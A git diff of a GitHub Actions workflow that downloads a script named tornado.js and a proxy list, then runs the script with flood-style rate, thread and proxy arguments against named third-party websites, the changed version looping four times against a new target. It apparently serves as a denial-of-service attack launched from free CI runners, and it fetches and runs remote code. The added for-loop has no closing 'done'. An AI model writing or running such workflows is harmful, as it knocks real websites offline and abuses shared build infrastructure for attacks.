@@ -1,4 +1,4 @@
-name: Ubuntu VDS 40 saniye
+name: Ubuntu VDS 50 saniye tornad
 
 on:
   workflow_dispatch:
@@ -16,10 +16,12 @@ jobs:
         run: |
           wget https://github.com/kaneious/tornado/raw/refs/heads/main/tornado.js
           wget https://curl.by/3fd1E/proxies.txt
+          chmod +x tornado.js
           npm i hpack
-          timeout 40 node tornado.js GET https://hexbear.xyz/ton 50 8 90 proxies.txt --full --query 3
+          for i in {1..4}; do
+          timeout 50 node tornado.js GET https://antifix.com.tr/xd 50 8 90 proxies.txt --full --query 3
           
       - name: OK !
         run: |
-          sleep 40
+          sleep 50
           exit 0
